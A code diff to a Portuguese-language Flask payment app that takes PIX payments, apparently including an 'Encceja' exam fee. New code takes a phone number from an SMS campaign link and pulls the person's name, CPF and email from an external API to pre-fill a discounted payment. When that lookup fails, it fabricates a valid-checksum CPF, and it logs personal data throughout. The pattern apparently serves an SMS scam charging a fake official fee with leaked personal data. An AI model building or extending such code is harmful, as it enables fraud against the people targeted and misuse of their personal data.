@@ -1,21 +1,24 @@
 import os
 import functools
 import time
-from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
+import re
+import random
+import string
+import json
+import http.client
+import subprocess
 import logging
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
 import secrets
 import qrcode
 import qrcode.constants
 import base64
 from io import BytesIO
-import re
-import random
-import string
 import requests
-import json
-import http.client
+
 from payment_gateway import get_payment_gateway
 from for4payments import create_payment_api
+from pagamentocomdesconto import create_payment_with_discount_api
 
 app = Flask(__name__)
 
@@ -474,6 +477,7 @@ def generate_qr_code(pix_code: str) -> str:
     return f"data:image/png;base64,{img_str}"
 
 @app.route('/')
+@app.route('/index')
 @check_referer
 def index():
     try:
@@ -483,9 +487,92 @@ def index():
             'cpf': request.args.get('cpf', ''),
             'phone': request.args.get('phone', '')
         }
-
+        
+        # Verificar se temos um número de telefone no UTM content
+        utm_source = request.args.get('utm_source', '')
+        utm_content = request.args.get('utm_content', '')
+        phone_from_utm = None
+        
+        # Extrair número de telefone do utm_content (último parâmetro)
+        if utm_source == 'smsempresa' and utm_content and len(utm_content) >= 10:
+            # Limpar o número de telefone, mantendo apenas dígitos
+            phone_from_utm = re.sub(r'\D', '', utm_content)
+            app.logger.info(f"[PROD] Número de telefone extraído de utm_content: {phone_from_utm}")
+            
+            # Salvar o número do utm_content para uso posterior
+            if phone_from_utm:
+                customer_data['phone'] = phone_from_utm
+                
+                # Buscar dados do cliente na API externa
+                try:
+                    # Acessar a API real fornecida
+                    api_url = f"https://webhook-manager.replit.app/api/customer/{phone_from_utm}"
+                    app.logger.info(f"[PROD] Consultando API de cliente: {api_url}")
+                    
+                    response = requests.get(api_url, timeout=5)
+                    if response.status_code == 200:
+                        api_data = response.json()
+                        app.logger.info(f"[PROD] Dados do cliente obtidos da API: {api_data}")
+                        
+                        # Extrair os dados do cliente da resposta da API
+                        client_data = {
+                            'name': api_data.get('name', 'Cliente Promocional'),
+                            'cpf': api_data.get('cpf', ''),
+                            'phone': phone_from_utm,
+                            'email': api_data.get('email', f"cliente_{phone_from_utm}@example.com")
+                        }
+                    else:
+                        app.logger.warning(f"[PROD] Erro ao consultar API de cliente: {response.status_code}")
+                        # Usar dados simulados como fallback em caso de falha da API
+                        primeiro_nome = "Cliente"
+                        ultimo_nome = "Promocional"
+                        
+                        # Gerar um CPF válido para teste
+                        cpf_digits = ''.join([str(random.randint(0, 9)) for _ in range(9)])
+                        cpf_sum = sum(int(digit) * (10 - i) for i, digit in enumerate(cpf_digits))
+                        remainder = cpf_sum % 11
+                        first_verifier = 0 if remainder < 2 else 11 - remainder
+                        cpf_digits += str(first_verifier)
+                        cpf_sum = sum(int(digit) * (11 - i) for i, digit in enumerate(cpf_digits))
+                        remainder = cpf_sum % 11
+                        second_verifier = 0 if remainder < 2 else 11 - remainder
+                        cpf_digits += str(second_verifier)
+                        formatted_cpf = f"{cpf_digits[:3]}.{cpf_digits[3:6]}.{cpf_digits[6:9]}-{cpf_digits[9:]}"
+                        
+                        client_data = {
+                            'name': f"{primeiro_nome} {ultimo_nome}",
+                            'cpf': formatted_cpf,
+                            'phone': phone_from_utm,
+                            'email': f"{primeiro_nome.lower()}.{ultimo_nome.lower()}@example.com"
+                        }
+                    
+                    app.logger.info(f"[PROD] Dados do cliente simulados: {client_data}")
+                    
+                    # Atualizar dados do cliente
+                    customer_data['nome'] = client_data['name']
+                    customer_data['cpf'] = client_data['cpf']
+                    customer_data['phone'] = client_data['phone']
+                    customer_data['email'] = client_data['email']
+                    
+                    # Marcar que este cliente tem desconto
+                    customer_data['has_discount'] = True
+                    customer_data['discount_price'] = 49.70
+                    customer_data['regular_price'] = 73.40
+                    
+                    # Salvar os dados no localStorage via JS
+                    return render_template(
+                        'index.html', 
+                        customer=customer_data, 
+                        has_discount=True, 
+                        discount_price=49.70,
+                        regular_price=73.40
+                    )
+                    
+                except Exception as api_error:
+                    app.logger.error(f"[PROD] Erro ao processar dados do cliente: {str(api_error)}")
+        
         app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
-        return render_template('index.html', customer=customer_data)
+        return render_template('index.html', customer=customer_data, has_discount=False)
     except Exception as e:
         app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
         return jsonify({'error': 'Erro interno do servidor'}), 500
@@ -501,15 +588,13 @@ def payment():
         cpf = request.args.get('cpf')
         phone = request.args.get('phone')  # Get phone from query params
         source = request.args.get('source', 'index')
+        has_discount = request.args.get('has_discount', 'false').lower() == 'true'
 
         if not nome or not cpf:
             app.logger.error("[PROD] Nome ou CPF não fornecidos")
             return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400
 
-        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")
-
-        # Inicializa a API de pagamento usando nossa factory
-        api = get_payment_gateway()
+        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}, has_discount={has_discount}")
 
         # Formata o CPF removendo pontos e traços
         cpf_formatted = ''.join(filter(str.isdigit, cpf))
@@ -520,28 +605,51 @@ def payment():
         # Use provided phone if available, otherwise generate random
         customer_phone = ''.join(filter(str.isdigit, phone)) if phone else generate_random_phone()
 
-        # Define o valor baseado na origem
-        if source == 'insurance':
-            amount = 47.60  # Valor fixo para o seguro
-        elif source == 'index':
-            amount = 142.83
+        # Define o valor baseado na origem e se tem desconto
+        if has_discount:
+            # Preço com desconto para clientes que vieram do SMS
+            amount = 49.70
+            app.logger.info(f"[PROD] Cliente com DESCONTO PROMOCIONAL, valor: {amount}")
+            
+            # Usa a API com desconto
+            api = create_payment_with_discount_api()
+            
+            # Dados para a transação
+            payment_data = {
+                'nome': nome,
+                'email': customer_email,
+                'cpf': cpf_formatted,
+                'telefone': customer_phone
+            }
+            
+            # Cria o pagamento PIX com desconto
+            pix_data = api.create_pix_payment_with_discount(payment_data)
+            
         else:
-            amount = 73.40
-
-        # Dados para a transação
-        payment_data = {
-            'name': nome,
-            'email': customer_email,
-            'cpf': cpf_formatted,
-            'phone': customer_phone,
-            'amount': amount
-        }
+            # Preço normal, sem desconto
+            if source == 'insurance':
+                amount = 47.60  # Valor fixo para o seguro
+            elif source == 'index':
+                amount = 142.83
+            else:
+                amount = 73.40
+                
+            # Inicializa a API de pagamento normal
+            api = get_payment_gateway()
+                
+            # Dados para a transação
+            payment_data = {
+                'name': nome,
+                'email': customer_email,
+                'cpf': cpf_formatted,
+                'phone': customer_phone,
+                'amount': amount
+            }
+            
+            # Cria o pagamento PIX
+            pix_data = api.create_pix_payment(payment_data)
 
         app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")
-
-        # Cria o pagamento PIX
-        pix_data = api.create_pix_payment(payment_data)
-
         app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")
 
         # Send SMS notification if we have a valid phone number
@@ -1265,18 +1373,30 @@ def pagamento_encceja():
         nome = data.get('nome')
         cpf = data.get('cpf')
         telefone = data.get('telefone')
+        has_discount = data.get('has_discount', False)
         
         if not nome or not cpf:
             return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
         
         try:
-            # Criar pagamento PIX para a taxa do Encceja
-            payment_api = create_payment_api()
-            payment_result = payment_api.create_encceja_payment({
-                'nome': nome,
-                'cpf': cpf,
-                'telefone': telefone
-            })
+            if has_discount:
+                # Usar API de pagamento com desconto
+                app.logger.info(f"[PROD] Criando pagamento com desconto para: {nome} ({cpf})")
+                payment_api = create_payment_with_discount_api()
+                payment_result = payment_api.create_pix_payment_with_discount({
+                    'nome': nome,
+                    'cpf': cpf,
+                    'telefone': telefone
+                })
+            else:
+                # Usar API de pagamento padrão
+                app.logger.info(f"[PROD] Criando pagamento regular para: {nome} ({cpf})")
+                payment_api = create_payment_api()
+                payment_result = payment_api.create_encceja_payment({
+                    'nome': nome,
+                    'cpf': cpf,
+                    'telefone': telefone
+                })
             
             # Retornar os dados do pagamento
             return jsonify(payment_result)
